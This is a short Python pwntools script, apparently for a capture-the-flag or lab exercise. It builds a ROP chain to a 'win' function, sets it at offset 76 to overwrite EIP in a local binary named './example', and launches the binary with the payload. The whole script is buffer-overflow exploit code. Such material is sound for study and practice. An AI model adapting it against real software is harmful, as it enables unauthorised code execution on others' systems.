#!/usr/bin/env python3

import sys
from pwn import *
from itertools import cycle

elf = ELF("./example")
elf.address = elf.libs['/app/example']

# Now, we can create our attack.
## --------------

rop = ROP(elf)
rop.win()


offset = 76 # This needs to be the offset for eip

## --------------

payload = flat({
    offset: rop.chain()
})

print("ropchain:")
print(rop.dump())
print("payload:")
print(rop.chain())

with elf.process([payload]) as p:
    p.interactive()

